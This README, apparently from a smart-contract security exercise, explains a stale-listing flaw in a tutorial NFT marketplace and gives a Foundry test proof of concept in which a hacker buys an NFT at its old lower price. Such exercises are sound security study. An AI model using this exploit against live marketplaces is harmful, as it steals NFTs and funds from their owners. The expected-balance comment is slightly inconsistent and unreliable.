# NFT marketplace exploit

Smart contract exploit on the most popular nft marketplace [tutorial](https://www.youtube.com/watch?v=GKJBEEXUha0&t)

## Exploit

An nft can be bought with the information of its previous listings by calling ```createMarketSale``` with older data and 

A hacker can buy any NFT listed with an older listing data by calling ```createMarketSale``` on a previous listing id.
For example, if an NFT is currently listed at 10 ether and it was listed at a 1 ether, a hacker can get buy it for 1 ether.

The 1 ether is transfered to the old lister instead of the current one.

    // Start seller has 1 NFT - 10 ether
    //       buyer has 10 ether
    //       hacker has 10 ether
    
    // Minter-Seller lists its nft for 1 ether
    vm.prank(seller);
    marketplace.createMarketItem{value:0 ether}(address(nft), 1, 1 ether);


    // buyer buys the nft for 1 ether & lists it for 10 ether
    
    vm.startPrank(buyer);
    marketplace.createMarketSale{value:1 ether}(address(nft), 1);
    nft.approve(address(marketplace), 1);
    marketplace.createMarketItem{value:0 ether}(address(nft), 1, 10 ether);
    vm.stopPrank();


    // hacker is able to buy the nft for 1 eth using the old listing data.
    // Buyer loses its nft
    
    vm.startPrank(hacker);
    marketplace.createMarketSale{value:1 ether}(address(nft), 1);
    
    assertEq(seller.balance, 12 ether);
    assertEq(buyer.balance, 9 ether);
    assertEq(hacker.balance, 9 ether);
    assertEq(nft.balanceOf(hacker), 1);

    // End (hacked) seller has 12 ether
    //              buyer has 9 ether
    //              hacker has 9 ether & 1 NFT


    // Expected    seller has 11 ether
    //              buyer has 19 ether
    //              NotHacker has 0 ether & 1 NFT

### Disclaimer
*The purpose of this repository is a simple security exercise & do not encourage to hack smart contracts in the real world.*
